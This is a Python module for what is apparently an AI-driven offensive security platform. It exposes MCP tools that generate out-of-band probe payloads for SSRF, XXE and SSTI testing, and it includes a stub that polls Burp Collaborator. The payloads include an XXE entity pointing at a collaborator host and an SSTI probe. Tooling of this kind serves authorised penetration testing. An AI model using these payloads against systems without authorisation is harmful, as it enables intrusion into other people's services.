"""AI Offensive Security Platform - Out-of-Band Testing Module"""
import httpx
import logging
import uuid
from mcp_instance import mcp

logger = logging.getLogger("stealthvision")
from config import DEFAULT_TIMEOUT, INTERACTSH_SERVER

@mcp.tool()
def oob_payload_gen(type: str = "dns", interaction_id: str = None) -> dict:
    """Generate OOB payloads for SSRF, SSTI, XXE testing."""
    if not interaction_id:
        interaction_id = str(uuid.uuid4())[:8]
    
    if type == "dns":
        payload = f"{interaction_id}.burpcollaborator.net"
    elif type == "http":
        payload = f"http://{interaction_id}.burpcollaborator.net"
    elif type == "xxe":
        payload = f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{interaction_id}.burpcollaborator.net\">]>"
    elif type == "ssti":
        # SSTI test payload
        payload = "{{7*7}}"
    else:
        payload = f"{interaction_id}.burpcollaborator.net"
    
    return {"payload": payload, "interaction_id": interaction_id, "success": True}

@mcp.tool()
def oob_poll(interaction_id: str) -> dict:
    """Poll Burp Collaborator for interactions (stub - requires API)."""
    return {"interactions": [], "count": 0, "success": True, "note": "Requires Burp Collaborator API setup"}